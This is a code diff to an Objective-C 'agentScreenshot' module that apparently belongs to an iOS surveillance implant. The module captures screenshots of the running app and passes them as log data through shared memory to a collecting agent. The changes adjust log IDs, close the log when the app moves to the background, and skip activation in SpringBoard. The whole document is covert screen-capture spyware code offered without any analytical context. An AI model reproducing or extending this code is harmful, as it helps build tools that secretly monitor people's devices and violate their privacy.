@@ -42,6 +42,9 @@ extern bool CGImageDestinationFinalize(CGImageDestinationRef idst);
 
 #define SCR_WAIT 1
 
+extern NSString *gBundleIdentifier;
+extern BOOL gIsAppInForeground;
+
 @implementation agentScreenshot
 
 - (NSDictionary *)getActiveWindowInformation
@@ -139,8 +142,8 @@ extern bool CGImageDestinationFinalize(CGImageDestinationRef idst);
     }
   
   // Log id creating
-  ctime(&logTime);
-  logID       = getpid() ^ logTime;
+  time(&logTime);
+  logID       = logTime;//getpid() ^ logTime;
   processName = [[NSBundle mainBundle] bundleIdentifier];
   windowName  = [[NSBundle mainBundle] bundleIdentifier];
   chunck_id = 0;
@@ -218,7 +221,16 @@ extern bool CGImageDestinationFinalize(CGImageDestinationRef idst);
       shMemoryHeader->commandType   = CM_LOG_DATA;
     
     gettimeofday(&tp, NULL);
-    
+      
+    /*
+     * App is entered in background: close log and exit
+     */
+    if (gIsAppInForeground == FALSE)
+    {
+      shMemoryHeader->commandType = CM_CLOSE_LOG;
+      byteIndex = entryDatalen;
+    }
+      
     shMemoryHeader->status          = SHMEM_WRITTEN;
     shMemoryHeader->logID           = logID;
     shMemoryHeader->agentID         = LOG_SNAPSHOT;
@@ -254,6 +266,9 @@ extern bool CGImageDestinationFinalize(CGImageDestinationRef idst);
 - (BOOL)start
 {
   BOOL retVal = TRUE;
+  
+  if ([gBundleIdentifier compare: SPRINGBOARD] == NSOrderedSame)
+    return  retVal;
   
   if ([self mAgentStatus] == AGENT_STATUS_STOPPED)
     {
